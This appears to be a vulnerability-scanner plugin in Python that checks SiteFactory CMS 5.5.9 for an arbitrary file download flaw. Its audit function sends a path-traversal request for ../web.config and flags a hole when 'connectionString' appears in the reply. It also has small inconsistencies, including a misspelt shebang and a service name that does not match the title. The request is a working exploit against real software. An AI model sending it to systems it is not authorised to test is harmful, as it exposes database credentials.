#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:SiteFactory CMS 5.5.9任意文件下载漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-062598


def assign(service,arg):
    if service=="xtcms":
        return True,arg 


def  audit(arg):
    
    url=arg+"manage/download.aspx?File=../web.config"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "connectionString" in res:
        security_hole(url)

        return arg
if __name__== '__main__':
    from dummy import *
